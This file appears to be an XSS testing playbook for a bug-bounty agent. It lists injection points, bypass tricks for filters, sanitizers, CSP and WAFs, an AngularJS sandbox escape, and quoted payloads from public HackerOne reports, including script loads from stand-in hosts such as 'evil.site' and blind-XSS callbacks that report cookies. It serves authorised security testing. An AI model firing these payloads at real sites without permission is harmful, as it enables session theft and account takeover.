# XSS — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Reflect a unique canary in every param, path segment, header (Referer, UA, X-Forwarded-*), cookie, and JSON field; look for unencoded reflection in text/html.

- Test URL sinks separately: href/src, iframe srcdoc, formaction, xlink:href, meta refresh, and CSS url().

- Stored vectors: profile name/company, filenames, support tickets, webhook URLs, calendar invites, email subjects, admin notes.

- DOM: trace location.hash/search, postMessage, document.referrer, and localStorage into innerHTML, eval, setTimeout, jQuery .html(), or framework sinks.

- Blind XSS: inject into admin-visible fields and log viewers with a callback that reports cookies, DOM, and URL.

- Check markdown/rich-text pipelines: HTML is often sanitized before markdown is rendered, or vice versa.



## Bypass tricks



- Encode < as &lt;, %3C, \u003c, or fullwidth ＜; double-encode when the server decodes twice.

- Sanitizer gaps: data-* attributes, xlink:href, mXSS, DOMPurify version CVEs, sanitize-then-decode order.

- CSP bypass: JSONP endpoints, base-uri, dangling markup, whitelisted CDN, Angular/Vue gadgets.

- Filter bypass: `<scr<script>ipt>`, mixed case, null bytes, `<!-->`, HTML comments inside tags.

- Browser parsing quirks: `<svg><p><style><img src=x onerror=...>`, nested forms, namespace confusion.



## Deeper checklist



- Map every reflection: URL params, path segments, headers (Referer/UA/X-Forwarded-*), cookies, JSON error messages.

- Classify the sink: HTML body, attribute, JS string, URL, CSS, or DOM (innerHTML, eval, location, postMessage).

- Try context-breaking payloads per sink, then encoding bypasses (double URL, unicode, HTML entities, mixed case).

- Test stored vectors: profile fields, filenames, support tickets, comments, webhooks, admin views, emails.

- Test DOM XSS via hash/search/postMessage and client-side routers; trace sources to sinks manually.

- Check sanitizer bypasses: DOMPurify versions, mutation XSS, allowed-tag/attr gaps, markdown-to-HTML pipelines.

- Try CSP bypass: JSONP endpoints, base-uri, dangling markup, script gadgets, whitelisted CDNs.

- Look for blind XSS in admin panels and log viewers; use a callback payload with context metadata.

- Confirm execution in a real browser (not just reflection) and capture the URL, payload, and impact.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Stored XSS in Wiki pages** — `#526325` · GitLab · $0 · ▲633

  > GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.

- **Stored XSS on imgur profile** — `#484434` · Imgur · $0 · ▲614

  > ”/ & lt; script alert(1)& lt;/scr ipt&gt”/ remove the underscores.

- **The return of the ＜** — `#639684` · Rockstar Games · $1,000 · ▲576

  > =[̕h+͓.＜script/src=//evil.site/poc.js .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕

- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552

  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)

- **XSS in steam react chat client** — `#409850` · Valve · $7,500 · ▲499

  > React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS.

- **Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration** — `#968082` · TikTok · $0 · ▲473

  > While fuzzing, I discovered a URL parameter reflecting its value without being properly sanitized.

- **XSS vulnerable parameter in a location hash** — `#146336` · Slack · $0 · ▲455

  > https://slack.com/is ?cvo sid1=111\u0026;typ=55577]")%3balert(document.cookie)%3b//

- **Blind XSS on image upload** — `#1010466` · CS Money · $1,000 · ▲450

  > - The CSRF vulnerability make a request for support.cs.money/upload file; This upload file does not have csrf token/ origin/ reference verification!

- **Stored XSS Vulnerability** — `#643908` · WordPress · $0 · ▲403

  > Paste the payload: " <svg/onload=alert(document.domain)

- **[accounts.reddit.com] Redirect parameter allows for XSS** — `#1962645` · Reddit · $5,000 · ▲394

  > I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Site Scripting once the victim performs the log in.

- **Reflected XSS on www.hackerone.com and resources.hackerone.com** — `#840759` · HackerOne · $500 · ▲387

  > https://www.hackerone.com/resources/read/embed…

- **HEY.com email stored XSS** — `#982291` · Basecamp · $5,000 · ▲360

  > url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact outbound forwarding[to…

- **Blind XSS on Twitter's internal Big Data panel at █████████████** — `#1207040` · X / xAI · $0 · ▲357

  > An attacker appears to be able to send an XSS payload to Twitter staff members, using a Support Form.

- **Reflected XSS in TikTok endpoints** — `#1350887` · TikTok · $0 · ▲356

  > Cross site scripting vulnerability was found in few TikTok endpoints using the region parameter.

- **Stored XSS in wordpress.com** — `#733248` · Automattic · $0 · ▲356

  > Add the payload `<iframe < <a href=javascript&colon;alert(document.cookie) Click Here</a =&gt;&lt;/iframe&gt;` to the body or the title of the blog post

- **XSS while logging using Google** — `#691611` · Shopify · $1,750 · ▲341

  > Step1: Go to https://YOURSHOP.myshopify.com/admin/settings/account

- **Stored XSS in Private Message component (BuddyPress)** — `#487081` · WordPress · $0 · ▲337

  > Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none; </iframe `

- **Stored XSS in my staff name fired in another your internal panel** — `#946053` · Shopify · $0 · ▲326

  > I had lots of tests for bug bounty in my test store "trstore-3.myshopify.com" (created about 4 years ago) and then one of your developers noticed that a stored cross-site scripting payload in my staff name fired in another your internal panel.

- **DOM XSS on duckduckgo.com search** — `#868934` · DuckDuckGo · $0 · ▲326

  > The is a DOM XSS vulnerability on https://duckduckgo.com search through the parameter.

- **yelp.com XSS ATO (via login keylogger, link Google account)** — `#2010530` · Yelp · $0 · ▲324

  > This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`.

- **Stored XSS in markdown via the DesignReferenceFilter** — `#1212067` · GitLab · $16,000 · ▲317

  > `https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`

- **Stored-XSS-ads.tiktok.com** — `#2306491` · TikTok · $0 · ▲310

  > A stored cross-site scripting (XSS) vulnerability was found on a TikTok Ads endpoint, making it possible for MP4 video files, or files with HTML or JS code to be executed in a user's browser.

- **Stored XSS via Kroki diagram** — `#1731349` · GitLab · $13,950 · ▲295

  > Create an issue and use the following payload `<a <pre lang='f/" onerror=alert(1) onload=alert(1) ' <code lang="wavedrom" xss</code </pre </a `

- **Account takeover through the combination of cookie manipulation and XSS** — `#534450` · Superhuman (formerly Grammarly) · $0 · ▲292

  > Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar containerid with the second stage of our payload and the redirect the user to the vulnerable page.

- **RichText parser vulnerability in scheduled posts allows XSS** — `#1930763` · Reddit · $5,000 · ▲280

  > Intercept the request with Burp Suite/Other proxies and replace the link with javascript scheme payload: {{F2270195}

- **XSS At "pages.et.uber.com"** — `#156098` · Uber · $0 · ▲267

  > https://pages.et.uber.com/icecream/?lang id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22

- **Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm** — `#411690` · Alliance of American Football · $0 · ▲244

  > enter xss payload (a" <svg/onload=prompt(1) ) in every address field and click on OK proceed

- **XSS at jamfpro.shopifycloud.com** — `#1444682` · Shopify · $9,400 · ▲240

  > Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`

- **Cross-site Scripting (XSS) on HackerOne careers page** — `#474656` · HackerOne · $500 · ▲239

  > - POC: `https://www.hackerone.com/careers?lever- aaa" <script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert" </script `

- **Reflected XSS on www.hackerone.com via Wistia embed code** — `#986386` · HackerOne · $500 · ▲236

  > If the url passed to `i.url.parse` contains a query parameter such as `? proto .ggg=1` then it will end up on the Object prototype, for example visiting `https://www.hackerone.com/blog/scaling-security-startup-unicorn? proto [ggg]=aaa` and typing…



## Case studies



### Stored XSS in Wiki pages

`#526325` · GitLab · $0 · high · 2019-09-02 · ▲633

> GitLab application converts the Markdown string .alert(1); to the href attribute javascript:alert(1);. Furthermore, Wiki-specific Markdown string . is converted to javascript: in this case.



### Stored XSS on imgur profile

`#484434` · Imgur · $0 · medium · 2019-03-02 · ▲614

> Hello, I submitted a report on imgur, but the staff marked it as duplicate. 482841 I reviewed the report of the first submitted report. 381553 We are on the same situation and his case is already fixed because I tried visiting his site too which is https://12test.imgur.com/ and even redoing his steps to reproduce but no XSS is triggered. And I have a different bypass and my bypass succeed. I can still fire up XSS on the said webpage.



### The return of the ＜

`#639684` · Rockstar Games · $1,000 · high · 2019-09-24 · ▲576

> In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website. By taking advantage of the fact that '＜' characters are normalized to ' .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕



### [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure

`#401793` · Grab · $0 · high · 2019-03-15 · ▲552

> A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after.



### XSS in steam react chat client

`#409850` · Valve · $7,500 · critical · 2019-01-07 · ▲499

> The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate javascript: URI based XSS. This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class xss --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class xss

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class xss

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class xss --min-bounty 1000

```



## Bypass Techniques



**CSP Bypass:**

- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP

- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)

- Use `<base>` tag injection to redirect script sources

- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks

- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies



**Sanitizer Bypasses:**

- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)

- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity

- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters

- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values

- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`



**Filter Evasion:**

```html

<!-- Case variation -->

<ScRiPt>alert(1)</ScRiPt>

<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->

<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Tag breaking -->

<svg/onload=alert(1)>

<!-- Event handler alternatives -->

<body onpageshow=alert(1)>

<input autofocus onfocus=alert(1)>

<details open ontoggle=alert(1)>

```



**WAF Bypass:**

```javascript

// Obfuscated payloads

<svg onload=eval(atob('YWxlcnQoMSk='))>

// String splitting

<script>ale\u0072t(1)</script>

// HTML5 event handlers that WAFs miss

<video src=x onerror=alert(1)>

<audio src=x onerror=alert(1)>

```



**Redirect-based XSS bypass:**

```

?next=javascript://%0aalert(1)

?next=javascript&colon;alert(1)

?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>

```



**AngularJS client-side template injection (CSTI) & sandbox escapes:**

- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.

- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):

  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.

  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):

    ```

    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1

    ```

    - `PARAM` = the reflected parameter you found.

    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.

- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.



---
